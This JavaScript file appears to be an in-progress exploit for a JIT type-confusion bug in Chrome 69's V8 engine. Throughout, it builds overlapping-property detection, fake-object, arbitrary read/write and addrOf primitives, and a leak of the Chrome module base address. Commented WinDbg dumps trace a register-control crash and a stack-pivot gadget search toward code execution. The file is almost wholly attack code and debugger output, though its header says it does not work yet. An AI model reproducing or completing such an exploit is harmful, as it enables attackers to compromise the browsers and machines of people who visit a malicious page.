// DOES NOT WORK YET CAN'T FIND AN OBJECT

let p1, p2;
let MAX_VALUES = 32
let MIN_VALUES = 0

let inChrome = true
let mode = "web-ui-asd"

let hashMap = {
    "chrome 69.0.3497.100": {
        "offset": 0xE0n
    },
    "d8 7.1.0": {
        "offset": 0xF0n
    },
}

function log(_function, _string) {
    if (mode === "d8") {
        print(`========================================`)
        print(`${_function}: ${_string}`)
        print(`========================================`)
    }
    else if (mode === "web-console") {
        console.log(`${_function}: ${_string}`)
    }
    else if (mode === "web-ui") {
        alert(`${_function}: ${_string}`)
    } else {

    }
}

function toNumber(value) {
    let floatView = new Float64Array(1);
    let uint64View = new BigUint64Array(floatView.buffer);
    uint64View[0] = value;
    return floatView[0];
}

function toInt32s(value) {
    let floatView = new Float64Array(1);
    let uint64View = new BigUint64Array(floatView.buffer);
    let uint32View = new Uint32Array(floatView.buffer);
    uint64View[0] = value;
    return [uint32View[0], uint32View[1]];
}

function hex(value) {
    if (value === undefined) return "undefined"
    return "0x" + value.toString(16)
}

function makeObj(arr) {
    let obj = { inline: 0x1234 };
    if (arr === undefined) {
        for (let i = 0; i < MAX_VALUES; i++) {
            Object.defineProperty(obj, 'p' + i, {
                writable: true,
                value: 0x4040+i
            });
        }
    } else {
        for (let i = 0; i < arr.length; i++) {
            Object.defineProperty(obj, 'p' + i, {
                writable: true,
                value: 0x4040+i
            });
        }
    }
    return obj;
}

function findOverlappingProperties() {
    // Create an array of all 32 property names such as p1..p32
    let pNames = [];
    let pValues = []
    for (let i = MIN_VALUES; i < MAX_VALUES; i++) {
        pNames[i] = 'p' + i;
        pValues[i] = 0x4040 + i;
    }
    // Create eval of our vuln function that will generate code during runtime
    eval(`
    function vuln(obj) {
        // Access Property inline of obj, forcing a CheckMap operation
        obj.inline;
        // Force a Map Transition via our side-effect
        this.Object.create(obj);
        // Trigger our type-confusion by accessing out-of-bound properties
        ${pNames.map((p) => `let ${p} = obj.${p};`).join('\n')}
        return [${pNames.join(', ')}];
    }
    `)
    // JIT code to trigger vuln
    for (let i = 0; i < 10000; i++) {
        // Create Object and pass it to Vuln function
        let res = vuln(makeObj(pValues));
        // Look for overlapping properties in results
        if (i === 9999) {
        	for (let j = 0; j < res.length; j++) {
        		valueToCompare = res[j] // res[j] from the DictionaryProperties
        		if ((pValues.includes(valueToCompare)) && (pNames[pValues.indexOf(valueToCompare)] !== "p"+j)) { // check if value is found in original pValues
        			index = pValues.indexOf(valueToCompare) // if it does get the index of the pValues to find the index of pNames (to know where in the DicionaryProperties can we control)
        			p1 = pNames[index]
        			p2 = "p"+j
                    log("findOverlappingProperties", "[-] Returning the first overlapping value found at " + p1 + " and " + p2 + ": " + hex(valueToCompare))
                    return
        		}
        	} 
        }
    }
    throw "[!] Failed to find overlapping properties";
}

function testFoundOverlappingProperties(_p1, _p2) {
    // Create an array of all 32 property names such as p1..p32
    valueToChangeFrom = 0xdead
    valueToChangeTo = 0xbeef

    // Create eval of our vuln function that will generate code during runtime
    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      return obj.${_p2}
    }
    `)

    // JIT code to trigger vuln
    for (let i = 0; i < 10000; i++) {
        eval(`
          let obj = makeObj();
          obj.${_p1} = ${valueToChangeTo}
          obj.${_p2} = ${valueToChangeFrom}
          let res = vuln(obj);
          if (i === 1 && hex(res) !== "${hex(valueToChangeFrom)}") {
            throw "[!] Something fked up";
          }
          if (i === 9999 && hex(res) !== "${hex(valueToChangeTo)}") {
            throw "[!] Something fked up";
          }
        `)
    }
    log("testFoundOverlappingProperties", "[+] Exploit works, carrying on to build rw primatives")
}

findOverlappingProperties();
testFoundOverlappingProperties(p1, p2)
  
function makeSpecialObj_must_be_done_this_way(must_pass_values_here) {
    let obj = {inline: 1234};
    for (let i = 0; i < MAX_VALUES; i++) {
        Object.defineProperty(obj, 'p' + i, {
            writable: true,
            value: must_pass_values_here[i]
        });
    }
    return obj;
}
  
function retrieveAddrOfFakeObjPrimative(_p1, _p2, _obj) {

    if (_obj === undefined) {
        _obj = {}
    }

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
    obj.inline;
    this.Object.create(obj);
    return obj.${_p2}.a
    }
    `)

    /*
    obj = { a: 0x41414141, b:1.1, c: {} }
    0:001> dqs  0000035F69410F49-1 <- obj
    0000035f`69410f48  000001f8`b350c431
    0000035f`69410f50  000002a5`75602cf1
    0000035f`69410f58  000002a5`75602cf1
    0000035f`69410f60  41414141`00000000 <- int
    0000035f`69410f68  3ff19999`9999999a <- float
    0000035f`69410f70  0000035f`69411001 <- nestedObj
    print(obj.c) returns [object Object]

    0:001> dqs  0000035F69410F49-1 <- obj
    0000035f`69410f48  000001f8`b350c431
    0000035f`69410f50  000002a5`75602cf1
    0000035f`69410f58  000002a5`75602cf1
    0000035f`69410f60  41414141`00000000 <- int
    0000035f`69410f68  3ff19999`9999999a <- float
    0000035f`69410f70  3ff19999`9999999a <- nestedObj (manually setting the object field to the float we observe)
    print(obj.c) returns 1072798105

    0:001> ? 0n1072798105
    Evaluate expression: 1072798105 = 00000000`3ff19999

    I suspect that the "shape" of the object stores information relating to the very data types of the inline properties

    Given that our vuln function will return obj.p2.a and our object looks like:
    obj.p1 = { a: 1.3 }
    obj.p2 = { a: 1.2 }
    Before TC we will return 1.2
    After TC will return 1.3, reading how 1.3 is represented in memory we get: 0x3ff4cccccccccccd which makes sense

    Even if we completely change the shape of obj.p1, like:
    obj.p1 = { b: 1.3 }
    obj.p2 = { a: 1.2 }
    We obtain the same results, this is because the initial type confusion has removed the check map to validate the
    existence of the a property on obj.p2. Even if we set obj.p1 to { b: 1.3, c: 1.4, d:1.5 }, the type confusion
    will cause us to just return the first property of obj.p1 and it will be interpreted as a float

    What if we change the type of obj.p1?
    obj.p1 = { a: 1 }
    obj.p2 = { a: 1.2 }
    We will return 2.121995791e-314 and the representation in memory is 0x100000000. If we throw 0x100000000 into a
    hex to double calculator, we will get: 2.121995791e-314.

    It would be nice if we can leak an object's address as a double
    Using: { a: objToLeak } we return [object Object]
    Using: { b: objToLeak } we return a float
    */

    pValues = []

    let floatToBeCorrupted = 1.1
    let objToLeak = _obj // { anything: 0xdeadbeef }
    pValues[parseInt(_p1_value)] = { screwArround: objToLeak }
    pValues[parseInt(_p2_value)] = { a: floatToBeCorrupted, b: floatToBeCorrupted }


    for (let i = 0; i < 10000; i++) {
        let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
        if (res !== floatToBeCorrupted) {
            let floatView = new Float64Array(1);
            floatView[0] = res;
            let uint64View = new BigUint64Array(floatView.buffer);
            log("retrieveAddrOfFakeObjPrimative", "[*] Verify that objToLeak address is: 0x" + uint64View[0].toString(16));
            //eval(` if ("d8" === "${mode}") %DebugPrint(objToLeak)`)
            return uint64View[0]-1n; // work with bigint
        }
    }
}

function writeFakeObjPrimative(_p1, _p2, _obj, _value) {

    if (_obj === undefined) {
        _obj = {}
    }

    if (_value === undefined) {
        _value = 0x41414141
    }

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let addressOfFakeObjToLeak = obj.${_p2}.b
      obj.${_p2}.b = ${_value}
      return addressOfFakeObjToLeak
    }
    `)

    pValues = []
    let floatToBeCorrupted = 1.1
    let objToLeak = _obj
    pValues[parseInt(_p1_value)] = { cannotbex: objToLeak }
    pValues[parseInt(_p2_value)] = { a:floatToBeCorrupted, b:floatToBeCorrupted }

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
      if (res !== floatToBeCorrupted) {
        log("writeFakeObjPrimative", `[*] Verify that we can write ${hex(_value)}: ${hex(res)}`)
        log("writeFakeObjPrimative", `[*] Note that we are writing to objToLeak in { cannotbex: objToLeak }. Hence when we try to retrieve it via obj._p2.b, we get ${hex(res)}`)
        break
      }
    }
}

function writeFakeObjPrimative_Leak(_p1, _p2, _obj, _value) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    if (_obj === undefined) {
        _obj = {}
    }

    if (_value === undefined) {
        _value = 0x41414141
    }

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let addressOfFakeObjToLeak = obj.${_p2}.b;
      obj.${_p2}.b = ${_value}; // must be a number type
      return addressOfFakeObjToLeak // should match _value_to_write
    }
    `)

    pValues = []
    let value = 1.1
    pValues[parseInt(_p1_value)] = _obj
    pValues[parseInt(_p2_value)] = {a:value, b:value}

    for (let i = 0; i < 10000; i++) {
      vuln(makeSpecialObj_must_be_done_this_way(pValues));
    }

    /*
    0:001> dqs 0000035F69413011-1
    0000035f`69413010  000001f8`b3504371
    0000035f`69413018  000002a5`75602cf1
    0000035f`69413020  000002a5`75602cf1
    0000035f`69413028  00000000`00000400
    0000035f`69413030  00000201`ecbdb4c0 <- Backing Store (Data from new BigUint64Array(new ArrayBuffer(1024)) accessible here)

    0:001> dqs 0000035F694132B9-1
    0000035f`694132b8  000001f8`b350c661
    0000035f`694132c0  000002a5`75602cf1
    0000035f`694132c8  000002a5`75602cf1
    0000035f`694132d0  402abd70`a3d70a3d <- first inline value
    0000035f`694132d8  402ac28f`5c28f5c3 <- second inline value 
    */
    log("writeFakeObjPrimative_Leak", `Note that we are writing to objToLeak itself, which should be arrayBuffer_1, with the address of arrayBuffer_2. Since we are writing to obj._p2.b, we are writing to the backing store of arrayBuffer_1`)
}

let arrayBuffer_1 = new ArrayBuffer(1024);
let arrayBuffer_2 = new ArrayBuffer(1024);

arrayBuffer_2_address = retrieveAddrOfFakeObjPrimative(p1, p2, arrayBuffer_2);
writeFakeObjPrimative(p1, p2)
writeFakeObjPrimative_Leak(p1, p2, arrayBuffer_1, toNumber(arrayBuffer_2_address))

let backingStoreOfArrayBuffer2 = new BigUint64Array(arrayBuffer_1) // BigUint64Array is like a wrapper to access ArrayBuffer, if you print(ArrayBuffer), you get [object ArrayBuffer], but if you print(BigUint64Array(ArrayBuffer)), you get the contents of ArrayBuffer itself
log("main", `[*] Verify that we have obtained the address to arrayBuffer_2's backing store at index 4: ${hex(backingStoreOfArrayBuffer2[4])}`)

function write64(_address, _value) {
    /*
        Sets the backing store value of arrayBuffer_2 to whatever _address is
        Since for our test, we are just going to test writing to arrayBuffer_2 itself, 
        we will write 0x41414141 to arrayBuffer_2
    */
    backingStoreOfArrayBuffer2[4] = _address
    let temp = new BigUint64Array(arrayBuffer_2)
    temp[0] = _value
}

function writeBytes(_address, _value) {
    /*
        Sets the backing store value of arrayBuffer_2 to whatever _address is
        Since for our test, we are just going to test writing to arrayBuffer_2 itself, 
        we will write 0x41414141 to arrayBuffer_2
    */
    backingStoreOfArrayBuffer2[4] = _address
    let temp = new Uint8Array(arrayBuffer_2)
    temp.set(_value);
}

function read64(_address) {
    backingStoreOfArrayBuffer2[4] = _address
    let temp = new BigUint64Array(arrayBuffer_2)
    return temp[0]
}

function testReadWritePrimatives() {
    write64(backingStoreOfArrayBuffer2[4], 0x41414141n);
    if (hex(read64(backingStoreOfArrayBuffer2[4])) !== "0x41414141") {
        throw "Something fked up!"
    }
    writeBytes(backingStoreOfArrayBuffer2[4], new Uint8Array([0x42, 0x42, 0x42, 0x42]));
    if (hex(read64(backingStoreOfArrayBuffer2[4])) !== "0x42424242") {
        throw "Something fked up!"
    }
    log("testReadWritePrimatives", "time to build addrOf primative :)")
}

testReadWritePrimatives()

function addrOf(_obj) {
    /*
    The following is for the structure of ArrayBuffer in memory specific (not Object)
    You can verify the following via %DebugPrint()

    0:001> dqs 000002C1E5E104E1-1
    000002c1`e5e104e0  00000111`a3a0c2a1
    000002c1`e5e104e8  000002c1`e5e10721 <- +8
    000002c1`e5e104f0  0000013d`38402cf1
    000002c1`e5e104f8  00000000`00000010
    000002c1`e5e10500  0000017f`3fbc0600
    000002c1`e5e10508  00000000`00000002
    000002c1`e5e10510  00000000`00000000
    000002c1`e5e10518  00000000`00000000
    000002c1`e5e10520  0000013d`384029c1
    000002c1`e5e10528  00000016`0a4509ee
    000002c1`e5e10530  72506775`62654425
    000002c1`e5e10538  74736574`28746e69
    000002c1`e5e10540  dead296e`69616761
    000002c1`e5e10548  0000013d`384023a1
    000002c1`e5e10550  00000001`00000000
    000002c1`e5e10558  00000263`50326d7b
    0:001> dqs 000002c1`e5e10721-1
    000002c1`e5e10720  0000013d`38403899
    000002c1`e5e10728  00000003`00000000
    000002c1`e5e10730  000002c1`e5e0f879 <- address of our object added via inline property
    000002c1`e5e10738  0000013d`384025a1
    000002c1`e5e10740  0000013d`384025a1
    000002c1`e5e10748  00000111`a3a04fa1
    000002c1`e5e10750  0000013d`38402cf1
    000002c1`e5e10758  000002c1`e5e10889
    000002c1`e5e10760  00000001`00000000
    000002c1`e5e10768  0000013d`38406e51
    000002c1`e5e10770  00000263`503254b1
    000002c1`e5e10778  00000111`a3a04fa1
    000002c1`e5e10780  0000013d`38402cf1
    000002c1`e5e10788  000002c1`e5e10799
    000002c1`e5e10790  00000001`00000000
    000002c1`e5e10798  0000013d`38402881
    */
    arrayBuffer_2.leakme = _obj;
    let property = read64(arrayBuffer_2_address + 0x08n)-1n;
    return read64(property + 0x10n) - 1n;
}

function testAddrOfPrimatives() {
    eval(`
    test = {a: 12345456};
    //if ("${mode}" === "d8") %DebugPrint(test);
    log("testAddrOfPrimatives", "Check that the addrOf primative is working: " + hex(addrOf(test)))
    `);
}

testAddrOfPrimatives()

var obj = new ArrayBuffer(0x1024);
var leakObj = addrOf(obj)
log("main", `Address of leaked date: ${hex(leakObj)}`)
var chrome_base_ptr = leakObj + 0x18n
var chrome_base = read64(chrome_base_ptr)-0x03f28210n
log("main", `chrome_base leaked: ${hex(chrome_base)}`)

var data1 = new ArrayBuffer(0x1024)
data1_uint = new Uint32Array(data1);

var data2 = new ArrayBuffer(0x1024)
data2_uint = new Uint32Array(data2);

var backingStorePtr = addrOf(data1)+0x20n
var backingStoreAddress = read64(backingStorePtr)

var backingStorePtr2 = addrOf(data2)+0x20n
var backingStoreAddress2 = read64(backingStorePtr2)

data1_uint[0] = Number(toInt32s(backingStoreAddress2)[0])
data1_uint[1] = Number(toInt32s(backingStoreAddress2)[1])

data2_uint[0] = 0x41414141
data2_uint[1] = 0x41414141

/*
data1_uint[2] = Number(toInt32s(backingStoreAddress)[0])
data1_uint[3] = Number(toInt32s(backingStoreAddress)[1])
data1_uint[4] = Number(toInt32s(backingStoreAddress)[0])+0x18
data1_uint[5] = Number(toInt32s(backingStoreAddress)[1])
data1_uint[48] = Number(toInt32s(chrome_base + 0x03690517n)[0]) // Pointer will point here
data1_uint[49] = Number(toInt32s(chrome_base + 0x03690517n)[1])
*/

log("main", `Backing store: ${hex(backingStorePtr)}`)

//write64(leakObj+0x20n, backingStorePtr+0n-0x68n)
//write64(leakObj+0x18n, backingStoreAddress-0x68n)
write64(leakObj+0x60n, 0x4141414141414141n)
write64(leakObj+0x58n, 0x4242424242424242n)
// force check to fail at chrome_child!GetHandleVerifier+0xc4a8f4 (part of a virtual function call)

/*
0:000> r
rax=00003ddd8203f638 rbx=00000058161fc2c0 rcx=000075524a00c000
rdx=00000058161fc2c0 rsi=00000058161fc3b0 rdi=00003ddd8203f680
rip=000075524a00c000 rsp=00000058161fc288 rbp=000000003bf02801
 r8=00000058161fc3b8  r9=000000003bf02801 r10=0000000000000001
r11=0000000000000001 r12=0000000000000000 r13=0000169813a23180
r14=00000058161fc3d0 r15=00000058161fc3d0
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
00007552`4a00c000 38f6            cmp     dh,dh
0:000> dqs 000075524a00c000
00007552`4a00c000  00003ddd`8203f638

when we call [rax+0b0], there is a reference to rcx, need to stack pivot

0:000> s -b 00007ffb05fa0000 00007ffb0abe4000 51 5c c3
00007ffb`09630517  51 5c c3 66 89 51 60 c3-cc 41 57 41 56 41 55 41  Q\.f.Q`..AWAVAUA
0:000> u 00007ffb`09630517
chrome_child!GetHandleVerifier+0x1b77ae7:
00007ffb`09630517 51              push    rcx
00007ffb`09630518 5c              pop     rsp
00007ffb`09630519 c3              ret
*/

/*
data1_uint[0] = Number(toInt32s(backingStoreAddress)[0])+0x8 // I will look at this guy and call a pointer, need to add 8 bytes cause thats where I will store the stack pivot
data1_uint[1] = Number(toInt32s(backingStoreAddress)[1])
data1_uint[2] = Number(toInt32s(backingStoreAddress)[0])
data1_uint[3] = Number(toInt32s(backingStoreAddress)[1])
data1_uint[4] = Number(toInt32s(backingStoreAddress)[0])+0x18
data1_uint[5] = Number(toInt32s(backingStoreAddress)[1])
data1_uint[48] = Number(toInt32s(chrome_base + 0x03690517n)[0]) // Pointer will point here
data1_uint[49] = Number(toInt32s(chrome_base + 0x03690517n)[1])
*/
//data1_uint[0] = 0x41414141
//data1_uint[1] = 0x41414141
// also eventually, we will call [ptr], where ptr is whatever that is stored here

